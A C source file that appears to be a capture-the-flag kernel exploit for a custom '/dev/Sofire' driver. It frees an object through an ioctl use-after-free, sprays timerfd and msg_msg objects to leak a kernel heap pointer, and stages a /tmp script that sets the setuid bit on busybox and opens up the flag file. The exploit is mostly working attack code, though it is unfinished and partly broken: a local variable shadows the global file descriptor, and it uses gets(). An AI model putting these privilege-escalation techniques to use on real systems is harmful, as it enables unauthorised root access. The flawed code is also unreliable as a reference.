#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/msg.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

#define CHUNK_SIZE 0x100
#define MSG_SIZE 128 -48
#define MSG_SPRAY_SIZE 0x10

int sofire_fd;
int msquid[MSG_SPRAY_SIZE];
char val[0x10];
int verbose =1;

#define debug_print(...)    do { if ( verbose) {printf(__VA_ARGS__);} \
} while (0)

#define input() do { printf("INPUT: "); gets(&val); } while (0)

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
		);
	puts("state saved");
}

//blah
typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;


typedef struct msg_msg_msg {
    long mtype;
    char mtext[MSG_SIZE];
} msg_msg_msg;


long chad_alloc(char *data){
    struct request req;
    req.idx = 1;
    memcpy(req.buffer, data, CHUNK_SIZE);
    return ioctl(sofire_fd, 0xdeadbeef, &req);
}



int create_timer(int leak)
{
    struct itimerspec its;

    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 0;
    its.it_value.tv_sec = 10;
    its.it_value.tv_nsec = 0;

    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(tfd, 0, &its, 0);

    if (leak)
    {
        close(tfd);
        sleep(1);
        return 0;
    }
}

unsigned long long spam_kernel(){
    struct msg_msg_msg msg;
    int msquid[MSG_SPRAY_SIZE];
    msg.mtype = 1;
    memset(msg.mtext, 0, MSG_SIZE);
    for(int i = 0; i < MSG_SPRAY_SIZE; ++i){
        msquid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        msgsnd(msquid[i], &msg, sizeof(msg.mtext), 0);
    }

    chad_alloc("HI");
    

    for(int i = 0; i < MSG_SPRAY_SIZE; ++i){
        if(msgrcv(msquid[i], &msg, sizeof(msg.mtext), 1, IPC_NOWAIT) < 0){
            puts("error recieving message");
            exit(0);
        }
        if(((unsigned long long **)msg.mtext)[8]!=0){
            return ((unsigned long long*)msg.mtext)[8];
        }
    }
    puts("no leak found :(");
    exit(1);
}

char* chad_read(int idx){
	struct request req;
    req.idx = idx;
    char * ret;
	ioctl(sofire_fd,0xcafebabe,&req);
    ret = malloc(sizeof(req.buffer));
    memcpy(ret, &req.buffer, sizeof(req.buffer));
	for(int i =0; i<32; ++i){
		printf("returned thing[%d]: %p\n", i, ((void**)req.buffer)[i]);
	}
    return ret;
}

void leet(){
    debug_print("[+] LEET Called\n");

    // UAF FREEEEEEE
    struct request req ={ 
        1337, "DOES NOT MATTER"
    };
    ioctl(sofire_fd, 0x1337, &req);
}

int main(int argc, char *argv[]){
    unsigned long ret;
    unsigned long long leaks;
	int sofire_fd = open("/dev/Sofire", O_RDONLY);

    system("echo -e '#!/bin/sh\nchmod 777 /flag.txt\nchmod u+s /bin/busybox\nchmod o+t /bin/\n' > /tmp/xxxx && chmod +x /tmp/xxxx && echo -e '\\xff\\xff\\xff\\xff' > /tmp/dummy && chmod +x /tmp/dummy");


    chad_alloc("FIRST ALLOC");
    chad_read(0);
    
    for (int i = 0; i < 0x100; i++) {
        create_timer(0);
    }

    leet();

    unsigned long long heap_leak = spam_kernel();
    printf("heap found: 0x%llx", heap_leak);
}
